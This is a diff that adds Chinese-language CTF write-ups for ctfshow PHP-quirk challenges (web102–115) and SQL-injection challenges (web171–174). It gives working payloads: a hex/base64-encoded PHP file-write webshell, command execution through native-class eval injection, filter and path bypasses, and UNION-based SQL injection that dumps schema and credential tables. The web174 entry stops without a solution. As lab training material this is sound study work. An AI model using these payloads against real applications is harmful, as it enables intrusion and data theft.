@@ -4257,7 +4257,899 @@ else{
 ?>
 ```
 
+分析一下这段代码
 
+首先这段代码会接收三个参数v1,v2,v3
+
+根据php的特性，当$v2为数字时$v4就会被赋值为1，而与$v3的值无关
+
+所以想要进入判断，我们首先要使v2为数字
+
+接着会通过substr对v2前两段进行截断并赋值给s
+
+下一步就会将v1和s都传入call_user_func函数
+
+
+
+**call_user_func函数有什么用呢?**
+
+`call_user_func` 是 PHP 中的一个内置函数，它的主要作用是调用回调函数。
+
+```
+function greet($name) {
+    return "Hello, $name!";
+}
+
+$message = call_user_func('greet', 'John');
+echo $message; 
+```
+
+
+
+我们先不管他怎么利用，接着往下看
+
+最后会调用file_put_contents函数，那思路就很明显了，我们通过写文件来拿到flag
+
+但是我们要将v2这一串数字经过一系列转换后写入文件并执行要怎么做呢？
+
+假如说我们可以将php代码转换成base64后再转换成hex，而得到的hex又刚好为数字，那我们就能实现我们的目标。
+
+**那怎么进行格式转换呢?**
+
+我们可以通过call_user_func函数调用php的内置类hex2bin，将我们传入的v2转换回base64编码，接着在写文件的时候，再通过php伪协议的方式将base64先转换为我们的代码再写入文件。
+
+经过尝试我们可以得到符合条件的代码
+
+```
+<?=`cat *`;
+base64:PD89YGNhdCAqYDs= (转hex去掉=)
+hex:5044383959474E6864434171594473
+```
+
+我们需要在hex前面随便加两位数字来绕过截断
+
+payload:
+
+```
+v1=hex2bin
+v2=665044383959474E6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
+```
+
+
+
+#### web103
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: atao
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-23 21:03:24
+
+*/
+
+
+highlight_file(__FILE__);
+$v1 = $_POST['v1'];
+$v2 = $_GET['v2'];
+$v3 = $_GET['v3'];
+$v4 = is_numeric($v2) and is_numeric($v3);
+if($v4){
+    $s = substr($v2,2);
+    $str = call_user_func($v1,$s);
+    echo $str;
+    if(!preg_match("/.*p.*h.*p.*/i",$str)){
+        file_put_contents($v3,$str);
+    }
+    else{
+        die('Sorry');
+    }
+}
+else{
+    die('hacker');
+}
+
+?>
+```
+
+这题相比上一题多了一个过滤
+
+```
+if(!preg_match("/.*p.*h.*p.*/i",$str)){
+        file_put_contents($v3,$str);
+    }
+    else{
+        die('Sorry');
+    }
+```
+
+继续用上题的方法即可
+
+payload:
+
+```
+v1=hex2bin
+v2=665044383959474E6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
+```
+
+#### web104
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: atao
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-28 22:27:20
+
+*/
+
+
+highlight_file(__FILE__);
+include("flag.php");
+
+if(isset($_POST['v1']) && isset($_GET['v2'])){
+    $v1 = $_POST['v1'];
+    $v2 = $_GET['v2'];
+    if(sha1($v1)==sha1($v2)){
+        echo $flag;
+    }
+}
+
+
+
+?>
+```
+
+使v1=v2即可
+
+```
+v1=1
+v2=1
+```
+
+#### web105
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-28 22:34:07
+
+*/
+
+highlight_file(__FILE__);
+include('flag.php');
+error_reporting(0);
+$error='你还想要flag嘛？';
+$suces='既然你想要那给你吧！';
+foreach($_GET as $key => $value){
+    if($key==='error'){
+        die("what are you doing?!");
+    }
+    $$key=$$value;
+}foreach($_POST as $key => $value){
+    if($value==='flag'){
+        die("what are you doing?!");
+    }
+    $$key=$$value;
+}
+if(!($_POST['flag']==$flag)){
+    die($error);
+}
+echo "your are good".$flag."\n";
+die($suces);
+
+?>
+```
+
+- 本题考查变量覆盖和`die()`的知识
+
+- `$$a = $$b`可以类似于，将$a的地址指向$b
+
+  所以无论$b怎么改变值，$a的值都会和$b一样
+
+- `die()`函数虽然会终止程序，但同时也会输出括号内的终止提示信息
+
+
+
+方法一：
+
+本题利用变量覆盖和`die()`函数的特性
+
+1. 先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces=flag，此时suces=>flag的地址
+2. 再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error=suces，此时error=>flag的地址
+3. 此时无论进入哪个`die()`函数，都可以输出`$flag`的值
+
+payload:
+
+```
+Get: suces=flag
+POST: error=suces
+```
+
+方法二：
+
+```
+Get: ?suces=flag&flag=
+```
+
+先将flag的值赋给suces，再将flag的值赋为空，从而通过判断，输出suces的值
+
+
+
+#### web106
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: atao
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-28 22:38:27
+
+*/
+
+
+highlight_file(__FILE__);
+include("flag.php");
+
+if(isset($_POST['v1']) && isset($_GET['v2'])){
+    $v1 = $_POST['v1'];
+    $v2 = $_GET['v2'];
+    if(sha1($v1)==sha1($v2) && $v1!=$v2){
+        echo $flag;
+    }
+}
+
+
+
+?>
+```
+
+我们使用数组绕过即可
+
+```
+v1[]=1
+v2[]=0
+```
+
+
+
+#### web107
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-28 23:24:14
+
+*/
+
+
+highlight_file(__FILE__);
+error_reporting(0);
+include("flag.php");
+
+if(isset($_POST['v1'])){
+    $v1 = $_POST['v1'];
+    $v3 = $_GET['v3'];
+       parse_str($v1,$v2);
+       if($v2['flag']==md5($v3)){
+           echo $flag;
+       }
+
+}
+
+
+
+?>
+```
+
+parse_str函数:它用于将字符串解析为变量，如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 arr 则会设置到该数组里 ）。
+
+```php
+<?php
+   //parse_str()将查询的字符串解析到变量中
+   parse_str("name=Gopal K Verma&age=45");
+   
+   echo $name."<br>";
+   echo $age;
+?>
+```
+
+其实实际上就是md5弱比较
+
+方法一：随便给一个值给flag，将MD5转换后的值赋给v3
+
+```
+v3=1
+v1=flag=c4ca4238a0b923820dcc509a6f75849b
+```
+
+方法二:数组绕过
+
+```
+v3[]=1
+v1="flag[]=1"
+```
+
+
+
+#### web108
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-28 23:53:55
+
+*/
+
+
+highlight_file(__FILE__);
+error_reporting(0);
+include("flag.php");
+
+if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
+    die('error');
+
+}
+//只有36d的人才能看到flag
+if(intval(strrev($_GET['c']))==0x36d){
+    echo $flag;
+}
+
+?>
+```
+
+题目给出的0x36d为16进制数，十进制为877，需要字母开头或结尾的话为877a，因为是==弱比较，可以等同于877，逆序后为a778,直接读取不行，需要加一个截断%00来绕过正则的判断。
+
+payload
+
+```
+GET:?c=a%00778
+```
+
+
+
+#### web109
+
+考点:php原生类利用
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-29 22:02:34
+
+*/
+
+
+highlight_file(__FILE__);
+error_reporting(0);
+if(isset($_GET['v1']) && isset($_GET['v2'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+
+    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
+            eval("echo new $v1($v2());");
+    }
+
+}
+
+?>
+```
+
+关于php原生类的利用
+
+https://blog.csdn.net/weixin_54902210/article/details/124689580
+
+payload:
+
+```
+v1=Exception&v2=system('cat fl36dg.txt') 
+or
+v1=Reflectionclass&v2=system('cat fl36dg.txt')
+```
+
+其他的原生类也行，比如Error
+
+#### web110
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-29 22:49:10
+
+*/
+
+
+highlight_file(__FILE__);
+error_reporting(0);
+if(isset($_GET['v1']) && isset($_GET['v2'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+
+    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
+            die("error v1");
+    }
+    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
+            die("error v2");
+    }
+
+    eval("echo new $v1($v2());");
+
+}
+
+?>
+```
+
+依旧是对php原生类的利用
+
+但是增加了对v1和v2的过滤，但是它没有过滤字母，考虑用纯字母构造payload
+
+类`FilesystemIterator`可以用来遍历目录，需要一个路径参数
+
+函数`getcwd`可以返回当前工作路径且不需要参数，由此可以构造payload
+
+```
+https://fded39f6-0eb1-430b-8f4f-42fd69937aed.challenge.ctf.show?v1=FilesystemIterator&v2=getcwd
+```
+
+![image-20250105235948415](assets/image-20250105235948415.png)
+
+得到flag的位置,直接访问即可
+
+
+
+#### web111
+
+```PHP
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-30 02:41:40
+
+*/
+
+highlight_file(__FILE__);
+error_reporting(0);
+include("flag.php");
+
+function getFlag(&$v1,&$v2){
+    eval("$$v1 = &$$v2;");
+    var_dump($$v1);
+}
+
+
+if(isset($_GET['v1']) && isset($_GET['v2'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+
+    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
+            die("error v1");
+    }
+    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
+            die("error v2");
+    }
+    
+    if(preg_match('/ctfshow/', $v1)){
+            getFlag($v1,$v2);
+    }
+   
+}
+?>
+```
+
+这题是关于变量覆盖的题目
+
+由于
+
+```
+if(preg_match('/ctfshow/', $v1)){
+            getFlag($v1,$v2);
+    }
+```
+
+所有我们可以确定v1的值只能为ctfshow
+
+接下来看getFlag函数
+
+```
+function getFlag(&$v1,&$v2){
+    eval("$$v1 = &$$v2;");
+    var_dump($$v1);
+}
+```
+
+getFlag函数会将v1的地址指向v2，也就是说会使v1的值等于v2
+
+var_dump则会输出变量的相关信息
+
+那我们只需要使v2的值等于我们要查询的变量就可以读到我们的flag
+
+但是问题来了，我们不知道要查的变量是什么，也不知道是不是在作用域里面
+
+所这里使用超全局变量 $GLOBALS，$GLOBALS 是PHP的一个超级全局变量组，包含了全部变量的全局组合数组，变量的名字就是数组的键。
+
+构造payload把所有全局变量全输出来
+
+```
+https://feec7abc-68b0-4b95-86bc-1db857e3624a.challenge.ctf.show?v1=ctfshow&v2=GLOBALS
+```
+
+![image-20250106003832148](assets/image-20250106003832148.png)
+
+#### web112
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-30 23:47:49
+
+*/
+
+highlight_file(__FILE__);
+error_reporting(0);
+function filter($file){
+    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
+        die("hacker!");
+    }else{
+        return $file;
+    }
+}
+$file=$_GET['file'];
+if(!is_file($file)){
+    highlight_file(filter($file));
+}else{
+    echo "hacker!";
+}
+```
+
+这题考察的是php伪协议，虽然被ban了data、input 等伪协议，又ban了 string、data、rot13 相关的过滤器，但是还是有不少能用的伪协议和过滤器
+
+如 php://filter（这里也用不到过滤器）
+
+```
+https://c9c112c8-f426-4008-9e05-712cff76e02c.challenge.ctf.show/?file=php://filter/resource=flag.php
+```
+
+其他
+
+```
+php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
+php://filter/read=convert.quoted-printable-encode/resource=flag.php
+compress.zlib://flag.php
+```
+
+**为什么不能直接输入flag.php呢?**
+
+```
+if(!is_file($file)){
+    highlight_file(filter($file));
+}else{
+    echo "hacker!";
+}
+```
+
+那是因为is_file("flag.php")==true，输出hacker！
+
+
+
+#### web113
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-30 23:47:52
+
+*/
+
+highlight_file(__FILE__);
+error_reporting(0);
+function filter($file){
+    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
+        die('hacker!');
+    }else{
+        return $file;
+    }
+}
+$file=$_GET['file'];
+if(! is_file($file)){
+    highlight_file(filter($file));
+}else{
+    echo "hacker!";
+}
+```
+
+这题相比上题把filter过滤了
+
+我们可以考虑使用其他伪协议
+
+如 compress.zlib://
+
+```
+compress.zlib://flag.php
+```
+
+
+
+**官方题解** 目录溢出导致is_file认为这不是一个文件
+
+```
+/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
+roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
+c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
+self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
+lf/root/proc/self/root/var/www/html/flag.php
+```
+
+
+
+#### web114
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-01 15:02:53
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+function filter($file){
+    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
+        die('hacker!');
+    }else{
+        return $file;
+    }
+}
+$file=$_GET['file'];
+echo "师傅们居然tql都是非预期 哼！";
+if(! is_file($file)){
+    highlight_file(filter($file));
+}else{
+    echo "hacker!";
+}
+```
+
+这题ban掉了compress和root没办法使用上题的两种解法，但是把filter放出来了
+
+```
+php://filter/resource=flag.php
+```
+
+直接读就完事了
+
+
+
+#### web115
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-01 15:08:19
+
+*/
+
+include('flag.php');
+highlight_file(__FILE__);
+error_reporting(0);
+function filter($num){
+    $num=str_replace("0x","1",$num);
+    $num=str_replace("0","1",$num);
+    $num=str_replace(".","1",$num);
+    $num=str_replace("e","1",$num);
+    $num=str_replace("+","1",$num);
+    return $num;
+}
+$num=$_GET['num'];
+if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
+    if($num=='36'){
+        echo $flag;
+    }else{
+        echo "hacker!!";
+    }
+}else{
+    echo "hacker!!!";
+}
+```
+
+参考文章:[ctfshow学习记录-web入门（php特性109-115&123&125-126）_ctfshow web109-CSDN博客](https://blog.csdn.net/m0_48780534/article/details/125523030)
+
+is_numeric可以在数字前面加空格绕过，同时加上空格也可以绕过$num!='36'
+
+但是我们知道trim函数是移除字符串两侧的空白字符或其他预定义字符，空格等字符是会被去掉的
+
+我们这里考虑使用%0c（换页符）进行绕过
+
+同时使用%0c也可以绕过filter。
+
+接下来再看第二个if判断，这是看起来很矛盾的一个判断。
+
+来具体看一下!==的定义，只要类型不同就不全等。
+
+![php比较](https://i-blog.csdnimg.cn/blog_migrate/fa3b23f0144b0dff5e00bdc93fabdf3b.png)
+
+> 如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。此规则也适用于 switch 语句。当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对。
+> 										——《php手册》语言参考-运算符-比较运算符
+
+也就是说!==时不进行类型转换。
+
+所以加上%0c换页符，在==进行类型转换，所有%0c36会被转换为数值36，结果true；在!==不进行类型转换，所以字符串和数值比较，类型不同，结果true。
+
+payload：
+
+```
+?num=%0c36
+```
+
+
+
+### sql注入
+
+#### web171
+
+```
+$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
+```
+
+flag是存在于username为flag的用户的数据中，我们只需要通过
+
+```
+1' or 1=1 --+
+```
+
+即可输出所有用户数据
+
+
+
+#### web172
+
+相比上一题，这题增加了过滤
+
+```
+//检查结果是否有flag
+if($row->username!=='flag'){
+      $ret['msg']='查询成功';
+    }
+```
+
+方法一: 联合查询
+
+因为联合查询只会显示password
+
+```
+api/?id=1' union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23
+
+/api/?id=1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()%23
+
+/api/?id=1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()%23
+
+//看到有3列 id,username,password
+
+/api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23
+
+//查询password发现没有flag
+
+//查另一个表 ctfshow_user2
+
+/api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23
+
+//看到flag
+```
+
+方法二: 将用户名字段进行编码，绕过检测
+
+```
+-1' union select to_base64(username),password from ctfshow_user2 --+
+```
+
+方法三: 只查询密码
+
+```
+-1' union select id,password from ctfshow_user2 where username='flag
+```
+
+
+
+#### web173
+
+过滤要求查询结果中不能出现flag字段
+
+```
+//检查结果是否有flag
+    if(!preg_match('/flag/i', json_encode($ret))){
+      $ret['msg']='查询成功';
+    }
+```
+
+方法一：联合查询
+
+和上题解法一样，只是这题flag在ctfshow_user3
+
+方法二：
+
+只查询password
+
+```
+-1' union select id,id,password from ctfshow_user3 where username='flag
+```
+
+方法三: 将用户名字段进行编码，绕过检测
+
+```
+-1' union select to_base64(username),password from ctfshow_user3 --+
+```
+
+
+
+#### web174
+
+输出时增加了过滤数字
+
+```
+//检查结果是否有flag
+    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
+      $ret['msg']='查询成功';
+    }
+      
+```
+
+​     
 
 ### 反序列化
 
